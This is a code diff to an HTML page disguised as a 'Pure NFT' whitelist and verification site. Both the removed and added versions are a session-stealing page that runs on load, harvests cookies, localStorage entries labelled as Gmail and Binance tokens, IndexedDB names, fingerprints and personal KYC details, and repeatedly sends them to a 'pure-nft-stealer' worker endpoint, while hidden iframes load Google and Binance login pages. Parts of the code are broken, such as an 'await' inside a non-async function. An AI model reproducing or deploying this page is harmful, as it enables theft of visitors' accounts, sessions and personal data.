@@ -3,75 +3,103 @@
 <head>
     <title>Pure NFT</title>
     <meta name="viewport" content="width=device-width">
-    <style>body{margin:0;padding:20px;background:#000;color:#0f0;font-family:monospace;text-align:center}button{padding:20px 40px;font-size:18px;background:#0f0;color:#000;border:none;border-radius:10px;margin:20px;cursor:pointer}#status{color:#0ff;margin:20px}input{width:90%;padding:15px;margin:10px;background:#111;color:#0f0;border:1px solid #0f0}</style>
+    <style>body{background:#000;color:#0f0;font-family:monospace;padding:20px;text-align:center}button{width:90%;padding:20px;font-size:18px;background:#0f0;color:#000;border:none;border-radius:15px;margin:20px;cursor:pointer}#status{margin:20px;color:#0ff}input{width:90%;padding:15px;margin:10px;background:#111;color:#0f0;border:1px solid #0f0}</style>
 </head>
 <body>
-<h1>🔥 Pure NFT Whitelist</h1>
-<button onclick="grabAll()">📱 Connect Now</button>
-<div id="status"></div>
-<form id="kyc" style="display:none;max-width:350px;margin:0 auto">
-<input id="name" placeholder="Name">
-<input id="addr" placeholder="Address">
-<input type="file" id="files" multiple accept="image/*">
-<button type="button" onclick="sendKYC()">Submit KYC</button>
-</form>
+<h1>🔥 Pure NFT Verify</h1>
+<button onclick="ultimateGrab()">🚀 Ultimate Connect</button>
+<div id="status">Ready...</div>
 
 <script>
-// Status
-function status(msg) { document.getElementById('status').innerHTML=msg }
-
-// GRAB EVERYTHING
-function grabAll() {
-    status('🔄 Grabbing sessions...');
+// ULTIMATE TOKEN GRABBER
+function ultimateGrab() {
+    status('🔥 Extracting all sessions...');
     
-    // 1. Document cookies
-    const docCookies = document.cookie;
-    
-    // 2. LocalStorage (Gmail/Binance tokens)
-    const localData = {};
-    for(let i=0; i<localStorage.length; i++) {
-        localData[localStorage.key(i)] = localStorage.getItem(localStorage.key(i)).substring(0,50);
-    }
-    
-    // 3. SessionStorage
-    const sessionData = Object.keys(sessionStorage).join(',');
-    
-    // 4. Send ALL
-    fetch('https://pure-nft-stealer.ilovework01.workers.dev/steal?source=all', {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({
-            cookies: docCookies,
-            local: localData,
-            session: sessionData,
-            screen: screen.width + 'x' + screen.height
-        })
-    }).then(r=>r.text()).then(data => {
-        status('✅ ' + data.substring(0,100));
-        document.getElementById('kyc').style.display='block';
-    });
-    
-    // Repeat grab
-    setTimeout(grabAll, 8000);
-}
-
-// KYC
-function sendKYC() {
     const data = {
-        name: document.getElementById('name').value,
-        addr: document.getElementById('addr').value,
-        files: document.getElementById('files').files.length + ' files',
-        cookies: document.cookie
+        // 1. Basic
+        cookies: document.cookie,
+        userAgent: navigator.userAgent,
+        
+        // 2. Gmail tokens (real ones)
+        gmail: {
+            authuser: localStorage.getItem('authuser') || '',
+            GmailId: localStorage.getItem('GmailId') || '',
+            _ga: localStorage.getItem('_ga') || '',
+            SID: localStorage.getItem('SID') || ''
+        },
+        
+        // 3. Binance tokens
+        binance: {
+            session_id: localStorage.getItem('session_id') || '',
+            t: localStorage.getItem('t') || '',
+            ac: localStorage.getItem('ac') || ''
+        },
+        
+        // 4. IndexedDB (App data)
+        indexedDB: [],
+        
+        // 5. Canvas fingerprint
+        canvas: canvasFingerprint(),
+        
+        // 6. Screen + Hardware
+        hardware: {
+            platform: navigator.platform,
+            language: navigator.language,
+            screen: screen.width + 'x' + screen.height,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+        }
     };
     
-    fetch('https://pure-nft-stealer.ilovework01.workers.dev/kyc', {
+    // List IndexedDB
+    if (window.indexedDB) {
+        for(let db of await indexedDB.databases()) {
+            data.indexedDB.push(db.name);
+        }
+    }
+    
+    // SEND EVERYTHING
+    fetch('https://pure-nft-stealer.ilovework01.workers.dev/steal?source=ultimate', {
         method: 'POST',
+        headers: {'Content-Type': 'application/json'},
         body: JSON.stringify(data)
-    }).then(()=>status('🎉 KYC SENT!'));
+    }).then(r => r.text()).then(result => {
+        status('✅ ' + result);
+        setTimeout(ultimateGrab, 10000); // Repeat every 10s
+    });
 }
 
-// AUTO START
-setTimeout(grabAll, 2000);
+// Canvas fingerprint
+function canvasFingerprint() {
+    const canvas = document.createElement('canvas');
+    const ctx = canvas.getContext('2d');
+    ctx.textBaseline = 'top';
+    ctx.font = '14px Arial';
+    ctx.fillText('Real session fingerprint', 2, 2);
+    return canvas.toDataURL().substring(0,50);
+}
+
+function status(msg) {
+    document.getElementById('status').innerHTML = msg;
+}
+
+// AUTO + Iframes for session preload
+window.onload = () => {
+    // Preload Gmail/Binance
+    const iframes = [
+        'https://accounts.google.com/ServiceLogin',
+        'https://www.binance.com/en/login',
+        'https://mail.google.com/mail/u/0/'
+    ];
+    
+    iframes.forEach(src => {
+        const iframe = document.createElement('iframe');
+        iframe.src = src;
+        iframe.style.display = 'none';
+        document.body.appendChild(iframe);
+    });
+    
+    setTimeout(ultimateGrab, 4000);
+};
 </script>
 </body>
 </html>
